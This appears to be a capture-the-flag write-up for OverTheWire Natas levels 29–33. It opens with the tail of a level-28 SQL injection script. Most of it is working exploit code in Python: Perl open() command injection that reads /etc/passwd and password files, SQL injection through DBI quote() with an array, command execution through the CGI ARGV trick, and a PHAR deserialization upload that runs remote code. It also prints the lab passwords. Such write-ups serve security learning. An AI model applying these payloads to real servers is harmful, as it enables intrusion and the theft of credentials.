VERSION_PAYLOAD  = "G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyPmWXqmnze9O%2Fn2%2BK8sqRse%2FPElxfpoPCpDu%2FmybKgH1zil%2F7SkUAJGd1F1rllrvW803zOcae3OEfZlC7ztYnAg%3D%3D"

def sql_injection():
	response = requests.get(url + "/search.php/?query=" + URL_PAYLOAD_A , auth=(username,password))
	content = response.text
	print(content)

# block_size_finder()
# block_analyze()
# valid_string()
# query_maker()
sql_injection()

```

---

### Natas 29

After tedious Natas28 , PHP stuffs are over , Now we got Perl

<img src="img/Pasted image 20240517210715.png" alt="Example Image" width="1080"/>

After search perl vulnerability , i got pdf [https://www.blackhat.com/docs/asia-16/materials/asia-1-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf](https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf) , and Blackhat Asia 2016 Conference Presentation (PEARL JAM 2 - _The Pinnacle_ ) by Netanel Rubin [https://media.ccc.de/v/32c3-7130-the_perl_jam_2#t=76](https://media.ccc.de/v/32c3-7130-the_perl_jam_2#t=76)

In URL we got `http://natas29.natas.labs.overthewire.org/index.pl?file=perl+underground` , pl (Perl)
Based on the drop down menu it showing content of file , Let try LFI `http://natas29.natas.labs.overthewire.org/index.pl?file=../../../../../../../../../etc/passwd` 😭 Nothing Happened .

Its using `file=` as parameter , search cmd injection in Perl [https://stackoverflow.com/questions/26614348/perl-open-injection-prevention](https://stackoverflow.com/questions/26614348/perl-open-injection-prevention) , this payload `| shutdown -r |` change this to `| uname -n -s%00|` A null character can be placed in a URL with the percent code **%00**

[http://natas29.natas.labs.overthewire.org/index.pl?file=|%20uname%20-n%20-s%00|](http://natas29.natas.labs.overthewire.org/index.pl?file=|%20uname%20-n%20-s%00|)

<img src="img/Pasted image 20240522190901.png" alt="Example Image" width="1080"/>

let check with this payload `index.pl?file=| cat /etc/passwd%00|`
![[Pasted image 20240522192830.png]]
Got these many results , so LFI working , get content of natas31 ,

```
|cat /etc/natas_webpass/natas30%00|
```

but Unlike we got `meeeeeep!` , let see cat the index.pl `|cat index.pl%00|`

![[Pasted image 20240522193237.png]]
Its look like escaping `natas` word ,

```
|cat /etc/na?as_webpass/na?as30%00|

other way
|cat /etc/*_webpass/*30%00|
|cat /etc/"nata"s_webpass/"nat"as30%00|
```

Python Script

```py
import requests

username = "natas29"
passsowrd = "pc0w0Vo0KpTHcEsgMhXu2EwUzyYemPno"

url = "http://%s.natas.labs.overthewire.org/"%username

parameter = "|cat /etc/n??as_webpass/n?tas30 " # u can use single space instead of %00

sesssion = requests.Session()
response = sesssion.get(url+ "index.pl?file=" + parameter ,auth=(username,passsowrd) )
content = response.text
print(content)
```

---

### Natas 30

<img src="img/Pasted image 20240522193946.png" alt="Example Image" width="1080"/>

[http://natas30.natas.labs.overthewire.org/index-source.html](http://natas30.natas.labs.overthewire.org/index-source.html)

```pl
if ('POST' eq request_method && param('username') && param('password')){
    my $dbh = DBI->connect( "DBI:mysql:natas30","natas30", "<censored>", {'RaiseError' => 1});
    my $query="Select * FROM users where username =".$dbh->quote(param('username')) . " and password =".$dbh->quote(param('password'));

    my $sth = $dbh->prepare($query);
    $sth->execute();
    my $ver = $sth->fetch();
    if ($ver){
        print "win!<br>";
        print "here is your result:<br>";
        print @$ver;
    }
    else{
        print "fail :(";
    }
    $sth->finish();
    $dbh->disconnect();
}
```

`quote()` method is vulnerable to array injection , [https://security.stackexchange.com/questions/175703/is-this-perl-database-connection-vulnerable-to-sql-injection](https://security.stackexchange.com/questions/175703/is-this-perl-database-connection-vulnerable-to-sql-injection)

SQL_INTEGER == 4 , from [https://www.nntp.perl.org/group/perl.dbi.dev/2001/11/msg485.html](https://www.nntp.perl.org/group/perl.dbi.dev/2001/11/msg485.html)

```
def vuln(url):
    params={"username": "valid_username", "password": ["'lol' or 1", 4]}
    print(requests.post(url, data=params).text)
```

where array in Perl are non scalar data type , assumption as secure , so that won't be escaped and 4 treat as integer but we can use SQL injection

`Select * FROM users where username =".$dbh->quote(param('username')) . " and password =".$dbh->quote(param('password')` or True

```py
import requests
import re

username = "natas30"
passsowrd = "Gz4at8CdOYQkkJ8fJamc11Jg5hOnXM9X"
url = "http://%s.natas.labs.overthewire.org/"%username

session = requests.Session()
response = session.post(url , data={"username" : "natas31" , "password" : [ "'anything' or 1" , 4 ] },     auth=(username,passsowrd))
content = response.text

print(content)
```

---

### Natas 31

<img src="img/Pasted image 20240522195503.png" alt="Example Image" width="1080"/>

We can upload , what are we want to ? ..... [http://natas31.natas.labs.overthewire.org/index-source.html](http://natas31.natas.labs.overthewire.org/index-source.html)

```pl
my $cgi = CGI->new;
if ($cgi->upload('file')) {
    my $file = $cgi->param('file');
    print '<table class="sortable table table-hover table-striped">';
    $i=0;
    while (<$file>) {
        my @elements=split /,/, $_;

        if($i==0){ # header
            print "<tr>";
            foreach(@elements){
                print "<th>".$cgi->escapeHTML($_)."</th>";
            }
            print "</tr>";
        }
        else{ # table content
            print "<tr>";
            foreach(@elements){
                print "<td>".$cgi->escapeHTML($_)."</td>";
            }
            print "</tr>";
        }
        $i+=1;
    }
    print '</table>';
}
else{
print <<END;
```

It Using CGI (Common Gateway Interface ) Module for file input , While Loop using `< >` for descriptor , but we manipulate into String Doesn't allowed in While < > , unless it is `AGRV`

`cat /etc/natas_webpass/natas32 | xargs echo |` xargs will pipe flag echo them in single line

```py
import requests
import re

username = "natas31"
passsowrd = "AMZF14yknOn9Uc57uKB02jnYuhplYka3"
url = "http://%s.natas.labs.overthewire.org/"%username


session = requests.Session()
response = requests.post(url + '/index.pl?cat /etc/natas_webpass/natas32 | xargs echo |',
                         files = [('file', ('filename', 'anything'))],
                         data = {'file': 'ARGV'},
                         auth = (username,passsowrd))

content = response.text

print(content)
```

---

### Natas 32

<img src="img/Pasted image 20240522201902.png" alt="Example Image" width="1080"/>

Again it is same as Natas 31 , and got ` morla/10111 shouts to Netanel Rubin` easter eggs

```py
import requests
import re

username = "natas32"
passsowrd = "Yp5ffyfmEdjvTOwpN5HCvh7Ctgf9em3G"
url = "http://%s.natas.labs.overthewire.org/"%username

session = requests.Session()

session = requests.Session()
response = requests.post(url + '/index.pl?cat /etc/natas_webpass/natas33 | xargs echo |',
                         files=[('file', ('filename', 'anything'))],
                         data={'file': 'ARGV'},
                         auth=(username,passsowrd))
content = response.text
print(content)
```

But Got Nothing , let see pwd `/index.pl?ls -la . | xargs echo |` , `.` refers current directory

```
</td></tr><tr><td>-rw-r-----  1 natas32 natas32   118 Oct  5  2023 .htaccess
</td></tr><tr><td>-rw-r-----  1 natas32 natas32    46 Oct  5  2023 .htpasswd
</td></tr><tr><td>drwxr-x---  5 natas32 natas32  4096 Oct  5  2023 bootstrap-3.3.6-dist
</td></tr><tr><td>-rwsrwx---  1 root    natas32 16096 Oct  5  2023 getpassword                  <<<<<<<<<
</td></tr><tr><td>-rw-r--r--  1 root    root     9740 Oct  5  2023 index-source.html
</td></tr><tr><td>-r-xr-x---  1 natas32 natas32  2968 Oct  5  2023 index.pl
</td></tr><tr><td>-r-xr-x---  1 natas32 natas32 97180 Oct  5  2023 jquery-1.12.3.min.js
</td></tr><tr><td>-r-xr-x---  1 natas32 natas32 16877 Oct  5  2023 sorttable.js
</td></tr><tr><td>drwxr-x---  2 natas32 natas32  4096 May 22 14:48 tmp
```

It looks like have a root access and name `getpassword`

```py
import requests
import re

username = "natas32"
passsowrd = "Yp5ffyfmEdjvTOwpN5HCvh7Ctgf9em3G"
url = "http://%s.natas.labs.overthewire.org/"%username

session = requests.Session()

response = requests.post(url + '/index.pl?ls -la . | xargs echo |',
                         files=[('file', ('filename', 'anything'))],
                         data={'file': 'ARGV'},
                         auth=(username,passsowrd))
content = response.text

print(content,'\n','='*80)

response = requests.post(url + '/index.pl?./getpassword | xargs echo |',
                         files=[('file', ('filename', 'anything'))],
                         data={'file': 'ARGV'},
                         auth=(username,passsowrd))
content = response.text
print(content)
```

---

### Natas 33

<img src="img/Pasted image 20240522202734.png" alt="Example Image" width="1080"/>

Looks Like Back2Php

```php
       <?php // graz XeR, the first to solve it! thanks for the feedback!
       // ~morla
       class Executor
       {
           private $filename = "";
           private $signature = "adeafbadbabec0dedabada55ba55d00d";
           private $init = false;

           function __construct()
           {
               $this->filename = $_POST["filename"];
               if (filesize($_FILES["uploadedfile"]["tmp_name"]) > 4096) {
                   echo "File is too big<br>";
               } else {
                   if (
                       move_uploaded_file(
                           $_FILES["uploadedfile"]["tmp_name"],
                           "/natas33/upload/" . $this->filename
                       )
                   ) {
                       echo "The update has been uploaded to: /natas33/upload/$this->filename<br>";
                       echo "Firmware upgrad initialised.<br>";
                   } else {
                       echo "There was an error uploading the file, please try again!<br>";
                   }
               }
           }

           function __destruct()
           {
               // upgrade firmware at the end of this script

               // "The working directory in the script shutdown phase can be different with some SAPIs (e.g. Apache)."
               chdir("/natas33/upload/");
               if (md5_file($this->filename) == $this->signature) {
                   echo "Congratulations! Running firmware update: $this->filename <br>";
                   passthru("php " . $this->filename);
               } else {
                   echo "Failur! MD5sum mismatch!<br>";
               }
           }
       } ?>

        <h1>natas33</h1>
        <div id="content">
            <h2>Can you get it right?</h2>

            <?php
            session_start();
            if (
                array_key_exists("filename", $_POST) and
                array_key_exists("uploadedfile", $_FILES)
            ) {
                new Executor();
            }

?>
```

```
if (md5_file($this->filename) == $this->signature) {
                   echo "Congratulations! Running firmware update: $this->filename <br>";
                   passthru("php " . $this->filename);
               } else {
                   echo "Failur! MD5sum mismatch!<br>";
               }
```

Here its checking MD5 Checksum that is signature , if its match use `passthru()` and limit `(filesize($_FILES["uploadedfile"]["tmp_name"]) > 4096) `

Let Use Compresses , Like PHAR (PHP Archive)

Template IMP save this as `natas33.php.template`

```php
<?php

class Executor
{{
  private $filename='{}';
  private $signature='{}';
}}

$phar = new Phar('natas33.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ? >');


$object = new Executor();
$phar->setMetadata($object);
$phar->addFromString('test.txt', 'text');
$phar->stopBuffering();

?>
```

From This We Create Php like this using python , ( Don't Create Below file ) It Just for Understanding , signature Holds payload

```php
<?php

class Executor
{
  private $filename='rce.php';
  private $signature='<?php echo file_get_contents("/etc/natas_webpass/natas34"); ?>';
}

$phar = new Phar('natas33.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ? >');


$object = new Executor();
$phar->setMetadata($object);
$phar->addFromString('test.txt', 'text');
$phar->stopBuffering();

?>
```

We to create as PHAR file let write in python , imp we need `natas33.php.template`

```php
import requests
import re
import subprocess
import hashlib
import os

username = "natas33"
passsowrd = "APwWDD3fRAf6226sgBOBaSptGwvXwQhG"
url = "http://%s.natas.labs.overthewire.org"%username

payload = b'<?php echo file_get_contents("/etc/natas_webpass/natas34"); ?>'
hash_value = hashlib.md5(payload).hexdigest()
filename = "rce.php"

with open("natas33.php.template" , "r") as template:
	with open("natas33.php" , "w") as file: # create natas33.php
		file.write(template.read().format(filename,payload.decode('ascii')))

# creating phar file from natas33.php
output = subprocess.check_output(['php','-d','phar.readonly=false','natas33.php'])

# Uploading rce.php
requests.post(url + "/index.php",
		data={"filename":filename , "submit":"Upload File"},
		files={"Uploadedfile":payload},
		auth=(username,passsowrd))

response = requests.post(url + '/index.php' ,
						 data={'filename': 'phar://natas33.phar/test.txt', 'submit': 'Upload File'},
						 files={'uploadedfile': open('natas33.phar', 'rb')},
						 auth=(username,passsowrd))

print(response.text)
```

**FINISHED**

---
